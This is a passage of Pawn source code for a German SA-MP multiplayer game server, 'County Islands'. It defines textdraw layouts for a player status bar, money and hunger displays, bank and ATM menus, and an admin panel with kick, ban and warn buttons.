	TextDrawSetProportional(UserBr[2], 1);
	TextDrawSetShadow(UserBr[2], 1);
	TextDrawUseBox(UserBr[2], 1);
	TextDrawBoxColor(UserBr[2], 555753672);
	TextDrawTextSize(UserBr[2], 32.000000, 0.000000);

	UserBr[3] = TextDrawCreate(35.000000, 425.000000, "   ");
	TextDrawBackgroundColor(UserBr[3], 255);
	TextDrawFont(UserBr[3], 1);
	TextDrawLetterSize(UserBr[3], 0.500000, -0.200000);
	TextDrawColor(UserBr[3], -1);
	TextDrawSetOutline(UserBr[3], 0);
	TextDrawSetProportional(UserBr[3], 1);
	TextDrawSetShadow(UserBr[3], 1);
	TextDrawUseBox(UserBr[3], 1);
	TextDrawBoxColor(UserBr[3], -1508633400);
	TextDrawTextSize(UserBr[3], -3.000000, -53.000000);

	UserBr[4] = TextDrawCreate(35.000000, 425.000000, "   ");
	TextDrawBackgroundColor(UserBr[4], 255);
	TextDrawFont(UserBr[4], 1);
	TextDrawLetterSize(UserBr[4], 0.500000, 1.599999);
	TextDrawColor(UserBr[4], -1);
	TextDrawSetOutline(UserBr[4], 0);
	TextDrawSetProportional(UserBr[4], 1);
	TextDrawSetShadow(UserBr[4], 1);
	TextDrawUseBox(UserBr[4], 1);
	TextDrawBoxColor(UserBr[4], -1508633400);
	TextDrawTextSize(UserBr[4], 32.000000, -54.000000);

	UserBr[5] = TextDrawCreate(3.000000, 424.000000, "INVENTAR");
	TextDrawBackgroundColor(UserBr[5], 255);
	TextDrawFont(UserBr[5], 1);
	TextDrawLetterSize(UserBr[5], 0.160000, 0.499999);
	TextDrawColor(UserBr[5], -1);
	TextDrawSetOutline(UserBr[5], 0);
	TextDrawSetProportional(UserBr[5], 1);
	TextDrawSetShadow(UserBr[5], 0);


	UserBr[7] = TextDrawCreate(598.000000, 436.000000, "24.11.2016");
	TextDrawBackgroundColor(UserBr[7], 255);
	TextDrawFont(UserBr[7], 2);
	TextDrawLetterSize(UserBr[7], 0.190000, 1.000000);
	TextDrawColor(UserBr[7], -1);
	TextDrawSetOutline(UserBr[7], 0);
	TextDrawSetProportional(UserBr[7], 1);
	TextDrawSetShadow(UserBr[7], 0);

	UserBr[8] = TextDrawCreate(542.000000, 436.000000, "12:38:12 UHR");
	TextDrawBackgroundColor(UserBr[8], 255);
	TextDrawFont(UserBr[8], 2);
	TextDrawLetterSize(UserBr[8], 0.190000, 1.000000);
	TextDrawColor(UserBr[8], -1);
	TextDrawSetOutline(UserBr[8], 0);
	TextDrawSetProportional(UserBr[8], 1);
	TextDrawSetShadow(UserBr[8], 0);

	UserBr[9] = TextDrawCreate(139.000000, 435.000000, "www.county-islands.com");
	TextDrawBackgroundColor(UserBr[9], 255);
	TextDrawFont(UserBr[9], 1);
	TextDrawLetterSize(UserBr[9], 0.240000, 1.200000);
	TextDrawColor(UserBr[9], -1);
	TextDrawSetOutline(UserBr[9], 0);
	TextDrawSetProportional(UserBr[9], 1);
	TextDrawSetShadow(UserBr[9], 0);

	UserBr[10] = TextDrawCreate(260.000000, 435.000000, "Hier koennte Ihre Werbung stehen, kommen sie zur Stadthalle!");
	TextDrawBackgroundColor(UserBr[10], 255);
	TextDrawFont(UserBr[10], 1);
	TextDrawLetterSize(UserBr[10], 0.240000, 1.200000);
	TextDrawColor(UserBr[10], -1);
	TextDrawSetOutline(UserBr[10], 0);
	TextDrawSetProportional(UserBr[10], 1);
	TextDrawSetShadow(UserBr[10], 0);

	UserBr[11] = TextDrawCreate(242.000000, 435.000000, "   ");
	TextDrawBackgroundColor(UserBr[11], 255);
	TextDrawFont(UserBr[11], 1);
	TextDrawLetterSize(UserBr[11], 0.500000, 1.599999);
	TextDrawColor(UserBr[11], -1);
	TextDrawSetOutline(UserBr[11], 0);
	TextDrawSetProportional(UserBr[11], 1);
	TextDrawSetShadow(UserBr[11], 1);
	TextDrawUseBox(UserBr[11], 1);
	TextDrawBoxColor(UserBr[11], -1508633400);
	TextDrawTextSize(UserBr[11], 239.000000, -54.000000);

	UserBr[12] = TextDrawCreate(540.000000, 435.000000, "   ");
	TextDrawBackgroundColor(UserBr[12], 255);
	TextDrawFont(UserBr[12], 1);
	TextDrawLetterSize(UserBr[12], 0.500000, 1.599999);
	TextDrawColor(UserBr[12], -1);
	TextDrawSetOutline(UserBr[12], 0);
	TextDrawSetProportional(UserBr[12], 1);
	TextDrawSetShadow(UserBr[12], 1);
	TextDrawUseBox(UserBr[12], 1);
	TextDrawBoxColor(UserBr[12], -1508633400);
	TextDrawTextSize(UserBr[12], 537.000000, -54.000000);

	UserBr[6] = TextDrawCreate(-7.000000, 421.000000, "_"); //Koffer
	TextDrawBackgroundColor(UserBr[6], 0);
	TextDrawFont(UserBr[6], 5);
	TextDrawLetterSize(UserBr[6], 1.740000, 3.900000);
	TextDrawColor(UserBr[6], -328859393);
	TextDrawSetOutline(UserBr[6], 0);
	TextDrawSetProportional(UserBr[6], 0);
	TextDrawSetShadow(UserBr[6], 1);
	TextDrawUseBox(UserBr[6], 1);
	TextDrawBoxColor(UserBr[6], -1);
	TextDrawTextSize(UserBr[6], 43.000000, 36.000000);
	TextDrawSetPreviewModel(UserBr[6], 1210);
	TextDrawSetPreviewRot(UserBr[6], 1.000000, 1.000000, 1.000000, 1.000000);
	TextDrawSetSelectable(UserBr[6], 1);

//UserBar
	GeldAnzeige[0] = TextDrawCreate(610.000000, 79.000000, "   ");
	TextDrawBackgroundColor(GeldAnzeige[0], 255);
	TextDrawFont(GeldAnzeige[0], 1);
	TextDrawLetterSize(GeldAnzeige[0], 0.500000, 1.100000);
	TextDrawColor(GeldAnzeige[0], -1);
	TextDrawSetOutline(GeldAnzeige[0], 0);
	TextDrawSetProportional(GeldAnzeige[0], 1);
	TextDrawSetShadow(GeldAnzeige[0], 1);
	TextDrawUseBox(GeldAnzeige[0], 1);
	TextDrawBoxColor(GeldAnzeige[0], 4194504);
	TextDrawTextSize(GeldAnzeige[0], 494.000000, -98.000000);
	TextDrawSetSelectable(GeldAnzeige[0], 0);

	GeldAnzeige[1] = TextDrawCreate(609.000000, 80.000000, "   ");
	TextDrawBackgroundColor(GeldAnzeige[1], 255);
	TextDrawFont(GeldAnzeige[1], 1);
	TextDrawLetterSize(GeldAnzeige[1], 0.500000, 1.000000);
	TextDrawColor(GeldAnzeige[1], -1);
	TextDrawSetOutline(GeldAnzeige[1], 0);
	TextDrawSetProportional(GeldAnzeige[1], 1);
	TextDrawSetShadow(GeldAnzeige[1], 1);
	TextDrawUseBox(GeldAnzeige[1], 1);
	TextDrawBoxColor(GeldAnzeige[1], 84215295);
	TextDrawTextSize(GeldAnzeige[1], 495.000000, -68.000000);
	TextDrawSetSelectable(GeldAnzeige[1], 0);

	GeldAnzeige[2] = TextDrawCreate(501.000000, 79.000000, "$");
	TextDrawBackgroundColor(GeldAnzeige[2], 9961727);
	TextDrawFont(GeldAnzeige[2], 2);
	TextDrawLetterSize(GeldAnzeige[2], 0.300000, 2.000000);
	TextDrawColor(GeldAnzeige[2], -1);
	TextDrawSetOutline(GeldAnzeige[2], 0);
	TextDrawSetProportional(GeldAnzeige[2], 1);
	TextDrawSetShadow(GeldAnzeige[2], 0);
	TextDrawSetSelectable(GeldAnzeige[2], 0);

	Hunger_box = TextDrawCreate(610.000000, 57.000000, "_");
	TextDrawBackgroundColor(Hunger_box, 255);
	TextDrawFont(Hunger_box, 1);
	TextDrawLetterSize(Hunger_box, 0.579999, 0.599999);
	TextDrawColor(Hunger_box, -1);
	TextDrawSetOutline(Hunger_box, 0);
	TextDrawSetProportional(Hunger_box, 1);
	TextDrawSetShadow(Hunger_box, 1);
	TextDrawUseBox(Hunger_box, 1);
	TextDrawBoxColor(Hunger_box, 255);
	TextDrawTextSize(Hunger_box, 544.000000, 3.000000);
	Hunger_box2 = TextDrawCreate(607.000000, 59.000000, "_");
	TextDrawBackgroundColor(Hunger_box2, 255);
	TextDrawFont(Hunger_box2, 1);
	TextDrawLetterSize(Hunger_box2, 0.549998, 0.099999);
	TextDrawColor(Hunger_box2, -65281);
	TextDrawSetOutline(Hunger_box2, 0);
	TextDrawSetProportional(Hunger_box2, 1);
	TextDrawSetShadow(Hunger_box2, 1);
	TextDrawUseBox(Hunger_box2, 1);
	TextDrawBoxColor(Hunger_box2, -1178926849);
	TextDrawTextSize(Hunger_box2, 546.000000, 5.000000);


	Bankmenu[0] = TextDrawCreate(500.000000, 101.000000, "_");
	TextDrawBackgroundColor(Bankmenu[0], 255);
	TextDrawFont(Bankmenu[0], 1);
	TextDrawLetterSize(Bankmenu[0], 0.500000, 18.399997);
	TextDrawColor(Bankmenu[0], -1);
	TextDrawSetOutline(Bankmenu[0], 0);
	TextDrawSetProportional(Bankmenu[0], 1);
	TextDrawSetShadow(Bankmenu[0], 1);
	TextDrawUseBox(Bankmenu[0], 1);
	TextDrawBoxColor(Bankmenu[0], 0x787878AA);
	TextDrawTextSize(Bankmenu[0], 135.000000, 67.000000);

	Bankmenu[1] = TextDrawCreate(491.000000, 109.000000, "_");
	TextDrawBackgroundColor(Bankmenu[1], 255);
	TextDrawFont(Bankmenu[1], 1);
	TextDrawLetterSize(Bankmenu[1], 0.500000, 16.500001);
	TextDrawColor(Bankmenu[1], -1);
	TextDrawSetOutline(Bankmenu[1], 0);
	TextDrawSetProportional(Bankmenu[1], 1);
	TextDrawSetShadow(Bankmenu[1], 1);
	TextDrawUseBox(Bankmenu[1], 1);
	TextDrawBoxColor(Bankmenu[1], 0x5F0000FF);
	TextDrawTextSize(Bankmenu[1], 145.000000, 71.000000);
	Bankmenu[2] = TextDrawCreate(491.000000, 109.000000, "_");
	TextDrawBackgroundColor(Bankmenu[2], 255);
	TextDrawFont(Bankmenu[2], 1);
	TextDrawLetterSize(Bankmenu[2], 0.500000, 3.700000);
	TextDrawColor(Bankmenu[2], -1);
	TextDrawSetOutline(Bankmenu[2], 0);
	TextDrawSetProportional(Bankmenu[2], 1);
	TextDrawSetShadow(Bankmenu[2], 1);
	TextDrawUseBox(Bankmenu[2], 1);
	TextDrawBoxColor(Bankmenu[2], 0x9B0000FF);
	TextDrawTextSize(Bankmenu[2], 145.000000, 0.000000);
	Bankmenu[3] = TextDrawCreate(196.000000, 116.000000, "County Islands Banking");
	TextDrawBackgroundColor(Bankmenu[3], 255);
	TextDrawFont(Bankmenu[3], 2);
	TextDrawLetterSize(Bankmenu[3], 0.519999, 1.700000);
	TextDrawColor(Bankmenu[3], -1);
	TextDrawSetOutline(Bankmenu[3], 1);
	TextDrawSetProportional(Bankmenu[3], 1);
	Bankmenu[4] = TextDrawCreate(149.000000, 153.000000, "__Einzahlen");
	TextDrawBackgroundColor(Bankmenu[4], 255);
	TextDrawFont(Bankmenu[4], 1);
	TextDrawLetterSize(Bankmenu[4], 0.560000, 1.700000);
	TextDrawColor(Bankmenu[4], -1);
	TextDrawSetOutline(Bankmenu[4], 0);
	TextDrawSetProportional(Bankmenu[4], 1);
	TextDrawSetShadow(Bankmenu[4], 1);
	TextDrawUseBox(Bankmenu[4], 1);
	TextDrawBoxColor(Bankmenu[4], 0x9B0000FF);
	TextDrawTextSize(Bankmenu[4], 268.000000, 20.000000);
    TextDrawSetSelectable(Bankmenu[4],1);
	Bankmenu[5] = TextDrawCreate(369.000000, 153.000000, "__Auszahlen");
	TextDrawBackgroundColor(Bankmenu[5], 255);
	TextDrawFont(Bankmenu[5], 1);
	TextDrawLetterSize(Bankmenu[5], 0.560000, 1.700000);
	TextDrawColor(Bankmenu[5], -1);
	TextDrawSetOutline(Bankmenu[5], 0);
	TextDrawSetProportional(Bankmenu[5], 1);
	TextDrawSetShadow(Bankmenu[5], 1);
	TextDrawUseBox(Bankmenu[5], 1);
	TextDrawBoxColor(Bankmenu[5], 0x9B0000FF);
	TextDrawTextSize(Bankmenu[5], 488.000000, 20.000000);
	TextDrawSetSelectable(Bankmenu[5],1);
	Bankmenu[6] = TextDrawCreate(149.000000, 183.000000, "_Uberweisen");
	TextDrawBackgroundColor(Bankmenu[6], 255);
	TextDrawFont(Bankmenu[6], 1);
	TextDrawLetterSize(Bankmenu[6], 0.560000, 1.700000);
	TextDrawColor(Bankmenu[6], -1);
	TextDrawSetOutline(Bankmenu[6], 0);
	TextDrawSetProportional(Bankmenu[6], 1);
	TextDrawSetShadow(Bankmenu[6], 1);
	TextDrawUseBox(Bankmenu[6], 1);
	TextDrawBoxColor(Bankmenu[6], 0x9B0000FF);
	TextDrawTextSize(Bankmenu[6], 268.000000, 20.000000);
    TextDrawSetSelectable(Bankmenu[6],1);
	Bankmenu[7] = TextDrawCreate(158.000000, 177.000000, "..");
	TextDrawBackgroundColor(Bankmenu[7], 255);
	TextDrawFont(Bankmenu[7], 1);
	TextDrawLetterSize(Bankmenu[7], 0.500000, 1.000000);
	TextDrawColor(Bankmenu[7], -1);
	TextDrawSetOutline(Bankmenu[7], 0);
	TextDrawSetProportional(Bankmenu[7], 1);
	TextDrawSetShadow(Bankmenu[7], 1);
	Bankmenu[8] = TextDrawCreate(369.000000, 183.000000, "Kontoauszug");
	TextDrawBackgroundColor(Bankmenu[8], 255);
	TextDrawFont(Bankmenu[8], 1);
	TextDrawLetterSize(Bankmenu[8], 0.560000, 1.700000);
	TextDrawColor(Bankmenu[8], -1);
	TextDrawSetOutline(Bankmenu[8], 0);
	TextDrawSetProportional(Bankmenu[8], 1);
	TextDrawSetShadow(Bankmenu[8], 1);
	TextDrawUseBox(Bankmenu[8], 1);
	TextDrawBoxColor(Bankmenu[8], 0x9B0000FF);
	TextDrawTextSize(Bankmenu[8], 488.000000, 20.000000);
    TextDrawSetSelectable(Bankmenu[8],1);
	Bankmenu[9] = TextDrawCreate(149.000000, 213.000000, "____Kredit");
	TextDrawBackgroundColor(Bankmenu[9], 255);
	TextDrawFont(Bankmenu[9], 1);
	TextDrawLetterSize(Bankmenu[9], 0.560000, 1.700000);
	TextDrawColor(Bankmenu[9], -1);
	TextDrawSetOutline(Bankmenu[9], 0);
	TextDrawSetProportional(Bankmenu[9], 1);
	TextDrawSetShadow(Bankmenu[9], 1);
	TextDrawUseBox(Bankmenu[9], 1);
	TextDrawBoxColor(Bankmenu[9], 0x9B0000FF);
	TextDrawTextSize(Bankmenu[9], 268.000000, 20.000000);
    TextDrawSetSelectable(Bankmenu[9],1);
	Bankmenu[10] = TextDrawCreate(369.000000, 213.000000, "Informationen");
	TextDrawBackgroundColor(Bankmenu[10], 255);
	TextDrawFont(Bankmenu[10], 1);
	TextDrawLetterSize(Bankmenu[10], 0.500000, 1.700000);
	TextDrawColor(Bankmenu[10], -1);
	TextDrawSetOutline(Bankmenu[10], 0);
	TextDrawSetProportional(Bankmenu[10], 1);
	TextDrawSetShadow(Bankmenu[10], 1);
	TextDrawUseBox(Bankmenu[10], 1);
	TextDrawBoxColor(Bankmenu[10], 0x9B0000FF);
	TextDrawTextSize(Bankmenu[10], 488.000000, 20.000000);
	TextDrawSetSelectable(Bankmenu[10],1);
	Bankmenu[11] = TextDrawCreate(473.000000, 106.000000, "X");
	TextDrawBackgroundColor(Bankmenu[11], 255);
	TextDrawFont(Bankmenu[11], 1);
	TextDrawLetterSize(Bankmenu[11], 0.569998, 1.399999);
	TextDrawColor(Bankmenu[11], -16776961);
	TextDrawSetOutline(Bankmenu[11], 0);
	TextDrawSetProportional(Bankmenu[11], 1);
	TextDrawSetShadow(Bankmenu[11], 1);
	TextDrawSetSelectable(Bankmenu[11],1);

	ATMmenu[0] = TextDrawCreate(500.000000, 101.000000, "_");
	TextDrawBackgroundColor(ATMmenu[0], 255);
	TextDrawFont(ATMmenu[0], 1);
	TextDrawLetterSize(ATMmenu[0], 0.500000, 15.399997);//0.5 18.4
	TextDrawColor(ATMmenu[0], -1);
	TextDrawSetOutline(ATMmenu[0], 0);
	TextDrawSetProportional(ATMmenu[0], 1);
	TextDrawSetShadow(ATMmenu[0], 1);
	TextDrawUseBox(ATMmenu[0], 1);
	TextDrawBoxColor(ATMmenu[0], 0x787878AA);
	TextDrawTextSize(ATMmenu[0], 135.000000, 67.000000);
	ATMmenu[1] = TextDrawCreate(491.000000, 109.000000, "_");
	TextDrawBackgroundColor(ATMmenu[1], 255);
	TextDrawFont(ATMmenu[1], 1);
	TextDrawLetterSize(ATMmenu[1], 0.500000, 13.500001);//0.5 16.5
	TextDrawColor(ATMmenu[1], -1);
	TextDrawSetOutline(ATMmenu[1], 0);
	TextDrawSetProportional(ATMmenu[1], 1);
	TextDrawSetShadow(ATMmenu[1], 1);
	TextDrawUseBox(ATMmenu[1], 1);
	TextDrawBoxColor(ATMmenu[1], 0x5F0000FF);
	TextDrawTextSize(ATMmenu[1], 145.000000, 71.000000);
	ATMmenu[2] = TextDrawCreate(491.000000, 109.000000, "_");
	TextDrawBackgroundColor(ATMmenu[2], 255);
	TextDrawFont(ATMmenu[2], 1);
	TextDrawLetterSize(ATMmenu[2], 0.500000, 3.700000);
	TextDrawColor(ATMmenu[2], -1);
	TextDrawSetOutline(ATMmenu[2], 0);
	TextDrawSetProportional(ATMmenu[2], 1);
	TextDrawSetShadow(ATMmenu[2], 1);
	TextDrawUseBox(ATMmenu[2], 1);
	TextDrawBoxColor(ATMmenu[2], 0x9B0000FF);
	TextDrawTextSize(ATMmenu[2], 145.000000, 0.000000);
	ATMmenu[3] = TextDrawCreate(196.000000, 116.000000, "County Islands Banking");
	TextDrawBackgroundColor(ATMmenu[3], 255);
	TextDrawFont(ATMmenu[3], 2);
	TextDrawLetterSize(ATMmenu[3], 0.519999, 1.700000);
	TextDrawColor(ATMmenu[3], -1);
	TextDrawSetOutline(ATMmenu[3], 1);
	TextDrawSetProportional(ATMmenu[3], 1);
	ATMmenu[4] = TextDrawCreate(149.000000, 153.000000, "__Auszahlen");
	TextDrawBackgroundColor(ATMmenu[4], 255);
	TextDrawFont(ATMmenu[4], 1);
	TextDrawLetterSize(ATMmenu[4], 0.560000, 1.700000);
	TextDrawColor(ATMmenu[4], -1);
	TextDrawSetOutline(ATMmenu[4], 0);
	TextDrawSetProportional(ATMmenu[4], 1);
	TextDrawSetShadow(ATMmenu[4], 1);
	TextDrawUseBox(ATMmenu[4], 1);
	TextDrawBoxColor(ATMmenu[4], 0x9B0000FF);
	TextDrawTextSize(ATMmenu[4], 268.000000, 20.000000);
    TextDrawSetSelectable(ATMmenu[4],1);
	ATMmenu[5] = TextDrawCreate(369.000000, 153.000000, "Kontoauszug");
	TextDrawBackgroundColor(ATMmenu[5], 255);
	TextDrawFont(ATMmenu[5], 1);
	TextDrawLetterSize(ATMmenu[5], 0.560000, 1.700000);
	TextDrawColor(ATMmenu[5], -1);
	TextDrawSetOutline(ATMmenu[5], 0);
	TextDrawSetProportional(ATMmenu[5], 1);
	TextDrawSetShadow(ATMmenu[5], 1);
	TextDrawUseBox(ATMmenu[5], 1);
	TextDrawBoxColor(ATMmenu[5], 0x9B0000FF);
	TextDrawTextSize(ATMmenu[5], 488.000000, 20.000000);
	TextDrawSetSelectable(ATMmenu[5],1);
	ATMmenu[6] = TextDrawCreate(149.000000, 183.000000, "_Uberweisen");
	TextDrawBackgroundColor(ATMmenu[6], 255);
	TextDrawFont(ATMmenu[6], 1);
	TextDrawLetterSize(ATMmenu[6], 0.560000, 1.700000);
	TextDrawColor(ATMmenu[6], -1);
	TextDrawSetOutline(ATMmenu[6], 0);
	TextDrawSetProportional(ATMmenu[6], 1);
	TextDrawSetShadow(ATMmenu[6], 1);
	TextDrawUseBox(ATMmenu[6], 1);
	TextDrawBoxColor(ATMmenu[6], 0x9B0000FF);
	TextDrawTextSize(ATMmenu[6], 268.000000, 20.000000);
    TextDrawSetSelectable(ATMmenu[6],1);
	ATMmenu[7] = TextDrawCreate(158.000000, 177.000000, "..");
	TextDrawBackgroundColor(ATMmenu[7], 255);
	TextDrawFont(ATMmenu[7], 1);
	TextDrawLetterSize(ATMmenu[7], 0.500000, 1.000000);
	TextDrawColor(ATMmenu[7], -1);
	TextDrawSetOutline(ATMmenu[7], 0);
	TextDrawSetProportional(ATMmenu[7], 1);
	TextDrawSetShadow(ATMmenu[7], 1);
	ATMmenu[8] = TextDrawCreate(369.000000, 183.000000, "Informationen");
	TextDrawBackgroundColor(ATMmenu[8], 255);
	TextDrawFont(ATMmenu[8], 1);
	TextDrawLetterSize(ATMmenu[8], 0.500000, 1.700000);
	TextDrawColor(ATMmenu[8], -1);
	TextDrawSetOutline(ATMmenu[8], 0);
	TextDrawSetProportional(ATMmenu[8], 1);
	TextDrawSetShadow(ATMmenu[8], 1);
	TextDrawUseBox(ATMmenu[8], 1);
	TextDrawBoxColor(ATMmenu[8], 0x9B0000FF);
	TextDrawTextSize(ATMmenu[8], 488.000000, 20.000000);
    TextDrawSetSelectable(ATMmenu[8],1);
	ATMmenu[9] = TextDrawCreate(473.000000, 106.000000, "X");
	TextDrawBackgroundColor(ATMmenu[9], 255);
	TextDrawFont(ATMmenu[9], 1);
	TextDrawLetterSize(ATMmenu[9], 0.569998, 1.399999);
	TextDrawColor(ATMmenu[9], -16776961);
	TextDrawSetOutline(ATMmenu[9], 0);
	TextDrawSetProportional(ATMmenu[9], 1);
	TextDrawSetShadow(ATMmenu[9], 1);
	TextDrawSetSelectable(ATMmenu[9],1);

	AdminPanel[0] = TextDrawCreate(444.000000, 52.000000, "_");
	TextDrawBackgroundColor(AdminPanel[0], 255);
	TextDrawFont(AdminPanel[0], 1);
	TextDrawLetterSize(AdminPanel[0], 0.500000, 23.100000);
	TextDrawColor(AdminPanel[0], -1);
	TextDrawSetOutline(AdminPanel[0], 0);
	TextDrawSetProportional(AdminPanel[0], 1);
	TextDrawSetShadow(AdminPanel[0], 1);
	TextDrawUseBox(AdminPanel[0], 1);
	TextDrawBoxColor(AdminPanel[0], 255);
	TextDrawTextSize(AdminPanel[0], 110.000000, 2.000000);
	AdminPanel[1] = TextDrawCreate(444.000000, 73.000000, "_");
	TextDrawBackgroundColor(AdminPanel[1], 255);
	TextDrawFont(AdminPanel[1], 1);
	TextDrawLetterSize(AdminPanel[1], 0.000000, -0.300000);
	TextDrawColor(AdminPanel[1], -1);
	TextDrawSetOutline(AdminPanel[1], 0);
	TextDrawSetProportional(AdminPanel[1], 1);
	TextDrawSetShadow(AdminPanel[1], 1);
	TextDrawUseBox(AdminPanel[1], 1);
	TextDrawBoxColor(AdminPanel[1], -1);
	TextDrawTextSize(AdminPanel[1], 110.000000, 2.000000);
	AdminPanel[2] = TextDrawCreate(444.000000, 52.000000, "_");
	TextDrawBackgroundColor(AdminPanel[2], 255);
	TextDrawFont(AdminPanel[2], 1);
	TextDrawLetterSize(AdminPanel[2], 0.500000, 1.899999);
	TextDrawColor(AdminPanel[2], -1);
	TextDrawSetOutline(AdminPanel[2], 0);
	TextDrawSetProportional(AdminPanel[2], 1);
	TextDrawSetShadow(AdminPanel[2], 1);
	TextDrawUseBox(AdminPanel[2], 1);
	TextDrawBoxColor(AdminPanel[2], -65281);
	TextDrawTextSize(AdminPanel[2], 110.000000, 2.000000);
	AdminPanel[4] = TextDrawCreate(125.000000, 89.000000, "Kicken");
	TextDrawBackgroundColor(AdminPanel[4], 255);
	TextDrawFont(AdminPanel[4], 1);
	TextDrawLetterSize(AdminPanel[4], 0.480000, 2.200000);
	TextDrawColor(AdminPanel[4], -1);
	TextDrawSetOutline(AdminPanel[4], 0);
	TextDrawSetProportional(AdminPanel[4], 1);
	TextDrawSetShadow(AdminPanel[4], 1);
	TextDrawUseBox(AdminPanel[4], 1);
	TextDrawBoxColor(AdminPanel[4], 65535);
	TextDrawTextSize(AdminPanel[4], 200.000000, 20.000000);
	TextDrawSetSelectable(AdminPanel[4],1);
	AdminPanel[5] = TextDrawCreate(125.000000, 134.000000, "Bannen");
	TextDrawBackgroundColor(AdminPanel[5], 255);
	TextDrawFont(AdminPanel[5], 1);
	TextDrawLetterSize(AdminPanel[5], 0.450000, 2.200000);
	TextDrawColor(AdminPanel[5], -1);
	TextDrawSetOutline(AdminPanel[5], 0);
	TextDrawSetProportional(AdminPanel[5], 1);
	TextDrawSetShadow(AdminPanel[5], 1);
	TextDrawUseBox(AdminPanel[5], 1);
	TextDrawBoxColor(AdminPanel[5], 65535);
	TextDrawTextSize(AdminPanel[5], 200.000000, 20.000000);
	TextDrawSetSelectable(AdminPanel[5],1);
	AdminPanel[6] = TextDrawCreate(125.000000, 181.000000, "Verwarnen");
	TextDrawBackgroundColor(AdminPanel[6], 255);
	TextDrawFont(AdminPanel[6], 1);
	TextDrawLetterSize(AdminPanel[6], 0.430000, 2.200000);
	TextDrawColor(AdminPanel[6], -1);
	TextDrawSetOutline(AdminPanel[6], 0);
	TextDrawSetProportional(AdminPanel[6], 1);
	TextDrawSetShadow(AdminPanel[6], 1);
	TextDrawUseBox(AdminPanel[6], 1);
	TextDrawBoxColor(AdminPanel[6], 65535);
	TextDrawTextSize(AdminPanel[6], 200.000000, 20.000000);
	TextDrawSetSelectable(AdminPanel[6],1);
	AdminPanel[7] = TextDrawCreate(125.000000, 228.000000, "Leben");
	TextDrawBackgroundColor(AdminPanel[7], 255);
	TextDrawFont(AdminPanel[7], 1);
	TextDrawLetterSize(AdminPanel[7], 0.500000, 2.20000);
	TextDrawColor(AdminPanel[7], -1);
	TextDrawSetOutline(AdminPanel[7], 0);
	TextDrawSetProportional(AdminPanel[7], 1);
	TextDrawSetShadow(AdminPanel[7], 1);
	TextDrawUseBox(AdminPanel[7], 1);
	TextDrawBoxColor(AdminPanel[7], 65535);
	TextDrawTextSize(AdminPanel[7], 200.000000, 20.000000);
	TextDrawSetSelectable(AdminPanel[7],1);
	AdminPanel[8] = TextDrawCreate(336.000000, 130.000000, "Ruestung");
	TextDrawBackgroundColor(AdminPanel[8], 255);
	TextDrawFont(AdminPanel[8], 1);
	TextDrawLetterSize(AdminPanel[8], 0.480000, 1.90000);
	TextDrawColor(AdminPanel[8], -1);
	TextDrawSetOutline(AdminPanel[8], 0);
	TextDrawSetProportional(AdminPanel[8], 1);
	TextDrawSetShadow(AdminPanel[8], 1);
	TextDrawUseBox(AdminPanel[8], 1);
	TextDrawBoxColor(AdminPanel[8], 65535);
	TextDrawTextSize(AdminPanel[8], 431.000000, 20.000000);
	TextDrawSetSelectable(AdminPanel[8],1);
	AdminPanel[9] = TextDrawCreate(234.000000, 89.000000, "Slap");
	TextDrawBackgroundColor(AdminPanel[9], 255);
	TextDrawFont(AdminPanel[9], 1);
	TextDrawLetterSize(AdminPanel[9], 0.509999, 1.900000);
	TextDrawColor(AdminPanel[9], -1);
	TextDrawSetOutline(AdminPanel[9], 0);
	TextDrawSetProportional(AdminPanel[9], 1);
	TextDrawSetShadow(AdminPanel[9], 1);
	TextDrawUseBox(AdminPanel[9], 1);
	TextDrawBoxColor(AdminPanel[9], 65535);
	TextDrawTextSize(AdminPanel[9], 303.000000, 20.000000);
	TextDrawSetSelectable(AdminPanel[9],1);
	AdminPanel[10] = TextDrawCreate(234.000000, 132.000000, "TV");
	TextDrawBackgroundColor(AdminPanel[10], 255);
	TextDrawFont(AdminPanel[10], 1);
	TextDrawLetterSize(AdminPanel[10], 0.410000, 1.9000);
	TextDrawColor(AdminPanel[10], -1);
	TextDrawSetOutline(AdminPanel[10], 0);
	TextDrawSetProportional(AdminPanel[10], 1);
	TextDrawSetShadow(AdminPanel[10], 1);
	TextDrawUseBox(AdminPanel[10], 1);
	TextDrawBoxColor(AdminPanel[10], 65535);
	TextDrawTextSize(AdminPanel[10], 303.000000, 20.000000);
	TextDrawSetSelectable(AdminPanel[10],1);
	AdminPanel[11] = TextDrawCreate(234.000000, 178.000000, "Interior");
	TextDrawBackgroundColor(AdminPanel[11], 255);
	TextDrawFont(AdminPanel[11], 1);
	TextDrawLetterSize(AdminPanel[11], 0.480000, 1.9000);
	TextDrawColor(AdminPanel[11], -1);
	TextDrawSetOutline(AdminPanel[11], 0);
	TextDrawSetProportional(AdminPanel[11], 1);
	TextDrawSetShadow(AdminPanel[11], 1);
	TextDrawUseBox(AdminPanel[11], 1);
	TextDrawBoxColor(AdminPanel[11], 65535);
	TextDrawTextSize(AdminPanel[11], 303.000000, 20.000000);
	TextDrawSetSelectable(AdminPanel[11],1);
	AdminPanel[12] = TextDrawCreate(234.000000, 227.000000, "Welt");
	TextDrawBackgroundColor(AdminPanel[12], 255);
	TextDrawFont(AdminPanel[12], 1);
	TextDrawLetterSize(AdminPanel[12], 0.480000, 1.9000);
	TextDrawColor(AdminPanel[12], -1);
	TextDrawSetOutline(AdminPanel[12], 0);
	TextDrawSetProportional(AdminPanel[12], 1);
	TextDrawSetShadow(AdminPanel[12], 1);
	TextDrawUseBox(AdminPanel[12], 1);
	TextDrawBoxColor(AdminPanel[12], 65535);
	TextDrawTextSize(AdminPanel[12], 303.000000, 20.000000);
	TextDrawSetSelectable(AdminPanel[12],1);
	AdminPanel[13] = TextDrawCreate(336.000000, 89.000000, "Fahrzeugfix");
	TextDrawBackgroundColor(AdminPanel[13], 255);
	TextDrawFont(AdminPanel[13], 1);
	TextDrawLetterSize(AdminPanel[13], 0.480000, 1.9000);
	TextDrawColor(AdminPanel[13], -1);
	TextDrawSetOutline(AdminPanel[13], 0);
	TextDrawSetProportional(AdminPanel[13], 1);
	TextDrawSetShadow(AdminPanel[13], 1);
	TextDrawUseBox(AdminPanel[13], 1);
	TextDrawBoxColor(AdminPanel[13], 65535);
	TextDrawTextSize(AdminPanel[13], 431.000000, 20.000000);
	TextDrawSetSelectable(AdminPanel[13],1);
	AdminPanel[14] = TextDrawCreate(336.000000, 225.000000, "Anschreiben");
	TextDrawBackgroundColor(AdminPanel[14], 255);
	TextDrawFont(AdminPanel[14], 1);
	TextDrawLetterSize(AdminPanel[14], 0.480000, 1.900000);
	TextDrawColor(AdminPanel[14], -1);
